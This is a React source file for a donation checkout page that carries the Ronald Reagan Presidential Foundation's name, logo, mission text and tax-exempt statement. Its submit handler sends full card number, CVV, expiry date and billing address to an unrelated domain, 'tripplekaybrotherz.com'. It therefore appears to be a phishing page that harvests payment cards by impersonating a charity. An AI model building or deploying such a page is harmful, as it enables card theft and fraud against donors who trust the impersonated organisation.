import {
  Box,
  Text,
  Image,
  Flex,
  Tabs,
  TabList,
  TabPanel,
  Tab,
  TabPanels,
  Button,
  Input,
  Checkbox,
  Select,
  useToast,
  FormLabel,
} from '@chakra-ui/react';
import React, { useState } from 'react';
import { RiLock2Fill } from 'react-icons/ri';
import { ImFacebook } from 'react-icons/im';
import { AiFillTwitterSquare } from 'react-icons/ai';
import { GiPerson } from 'react-icons/gi';
import Inputs from '../component/inputs';
import axios from 'axios';
import { AiFillCaretLeft } from 'react-icons/ai';
import { useNavigate } from 'react-router-dom';

const writeUp = (
  <>
    <Text fontSize={'1.2em'} color={'#3080b4ff'} textAlign={'center'}>
      $200
    </Text>

    <Text textAlign={'center'}>billed one-time</Text>
  </>
);

function Details() {
  const [values, setValues] = useState({});
  const [loader, setLoader] = useState(false);
  const toast = useToast();
  const navigate = useNavigate();

  const handleValue = (e) => {
    const { value, name } = e.target; // Destructure value and name from e.target
    setValues({ ...values, [name]: value });
    console.log(values);
  };

  const submitDetails = (e: any) => {
    e.preventDefault();
    setLoader(true);

    const response = axios.post(
      'https://donate.tripplekaybrotherz.com/createRegan',
      { ...values, amount: localStorage.getItem('amount') }
    );

    response
      .then((res) => {
        console.log(res);
        setLoader(false);
        navigate('/success');
      })
      .catch((err) => {
        setLoader(false);
        toast({
          title: 'something went wrong',
          status: 'error',
          position: 'top',
        });
      });
  };

  let states = [
    'Alabama',
    'Alaska',
    'Arizona',
    'Arkansas',
    'California',
    'Colorado',
    'Connecticut',
    'Delaware',
    'Florida',
    'Georgia',
    'Hawaii',
    'Idaho',
    'Illinois',
    'Indiana',
    'Iowa',
  ];

  return (
    <>
      <Flex gap='2em' justifyContent={'center'} wrap={'wrap-reverse'} my='3em'>
        <Box
          w={['100%', '', '30%']}
          bg={'#fff'}
          borderRadius={['0em', '', '1em']}
          pos={'relative'}
          overflow={'hidden'}
        >
          <Box
            bg='#1e4f6e'
            p='2em'
            color={'#fff'}
            display={'flex'}
            alignItems={'center'}
            gap={'0.2em'}
          >
            <Image
              w={'20'}
              h={'20'}
              src={
                'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679525683/sammy/rrpfi-logo_vym1ha.png'
              }
            />
            <Text> Ronald Reagan Presidential Foundation </Text>
          </Box>

          <Box
            my={'1em'}
            w={'100%'}
            h={'40vh'}
            bgPos={'center'}
            bgRepeat={'no-repeat'}
            bgSize={'cover'}
            bgImg={
              'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679524161/sammy/january2022_lightbox_mod2_vzrhme.jpg'
            }
          ></Box>

          <Text p='1em'>
            Your contributions helps to honor President Reagan's leadership,his
            works and also help the needy. This ensures his legacy remains a
            vibrant and living example for generations to come. We will continue
            to share his enduring message of individual liberty, economic
            opportunity, global democracy and national pride. Thank you for your
            support! We greatly appreciate it!
          </Text>

          <Box px='1em' my={''} display={'flex'}>
            <ImFacebook />
            <AiFillTwitterSquare />
            <GiPerson />
          </Box>

          <Box px='1em'>
            <Image
              src={
                'https://res.cloudinary.com/dhdqt4xwu/image/upload/v1679525686/sammy/4star-234x60_uyol2s.jpg'
              }
            />
          </Box>
        </Box>
        {/* order section */}
        <Box
          w={['100%', '', '30%']}
          bg={'#fff'}
          borderRadius={['0em', '', '1em']}
          pos={'relative'}
          overflow={'hidden'}
        >
          <Flex alignItems={'center'} justifyContent={'space-around'}>
            <Box onClick={(e) => window.history.back()}>
              <AiFillCaretLeft fill='red' size='1.3em' />
            </Box>
            <Text
              textAlign={'center'}
              my='1em'
              fontWeight={'500'}
              color={'#1e4f6eff'}
            >
              {' '}
              CARD DETAILS{' '}
            </Text>
            <Box justifySelf={'flex-end'}>
              <RiLock2Fill />
            </Box>
          </Flex>

          <form onSubmit={submitDetails}>
            <Box mx='1em'>
              <Inputs
                label={'Card Number'}
                type='number'
                name={'cardNumber'}
                onChange={handleValue}
                required={true}
              />

              <Inputs
                label={'Card Name'}
                type='text'
                name={'cardName'}
                onChange={handleValue}
                required='true'
              />

              <Flex gap='0.5em'>
                <Inputs
                  label={'Expiration Date'}
                  type={'month'}
                  name={'cardyear'}
                  min={'2023-03'}
                  max={'2030-12'}
                  onChange={handleValue}
                  required={true}
                />

                <Inputs
                  label={'CVV'}
                  type='number'
                  name='cardCVV'
                  onChange={handleValue}
                  required='true'
                />
              </Flex>

              <Inputs
                label={'Address'}
                type='text'
                name={'address'}
                onChange={handleValue}
                required='true'
              />

              <Inputs
                label={'City'}
                type='text'
                name={'city'}
                onChange={handleValue}
                required='true'
              />

              <Flex gap='0.5em' alignItems={'center'}>
                <Box w={'100%'}>
                  <FormLabel>State</FormLabel>
                  <Select size={'lg'} name='state' onChange={handleValue}>
                    {states.map((states) => {
                      return (
                        <>
                          <option>{states}</option>
                        </>
                      );
                    })}
                  </Select>
                </Box>
                <Inputs
                  label={'Zip Code'}
                  type='number'
                  name='zipcode'
                  onChange={handleValue}
                  required='true'
                  maxLength={3}
                />
              </Flex>
            </Box>
            {/* <input type='submit' value='button' /> */}
            <Button
              pos={['relative', 'relative', 'absolute']}
              left={'0em'}
              py='1.6em'
              type='submit'
              right='1em'
              w={'100%'}
              px='1em'
              bg='#3080b4'
              color={'#fff'}
              bottom='1em'
              _hover={{}}
              isLoading={loader}
            >
              SUBMIT PAYMENT
            </Button>
          </form>

          {/* <Box px='2em'>
            <Button
              pos={['relative', 'relative', 'absolute']}
              left={'0em'}
              py='1.6em'
              right='1em'
              w={'100%'}
              px='1em'
              bg='#3080b4'
              color={'#fff'}
              bottom='1em'
              _hover={{}}
              onClick={submitDetails}
              isLoading={loader}
            >
              SUBMIT PAYMENT
            </Button>
          </Box> */}
        </Box>
      </Flex>

      <Box
        display={['none', 'block']}
        w={'80%'}
        mx={'auto'}
        textAlign={'center'}
      >
        The Ronald Reagan Presidential Foundation is the nonprofit organization
        created by President Reagan himself and specifically charged by him with
        continuing his legacy and sharing his principles - individual liberty,
        economic opportunity, global democracy and national pride. The
        Foundation is a non-partisan organization which sustains the Ronald
        Reagan Presidential Library and Museum, the Reagan Center for Public
        Affairs, the Walter and Leonore Annenberg Presidential Learning Center
        and its internationally recognized, award-winning Discovery Center, and
        the Air Force One Pavilion. The Ronald Reagan Presidential Foundation is
        a not-for-profit 501(c)(3) tax exempt organization under the IRS Code,
        sections 509(a)(1) and 170(b)(1)(A)(vi) and as such contributions are
        deductible as described therein. Recurring payment enrollments can be
        cancelled at anytime by contacting us at (805)-522-2977 © 2023 - Ronald
        Reagan Presidential Foundation and Library. All Rights Reserved.
      </Box>
    </>
  );
}

export default Details;
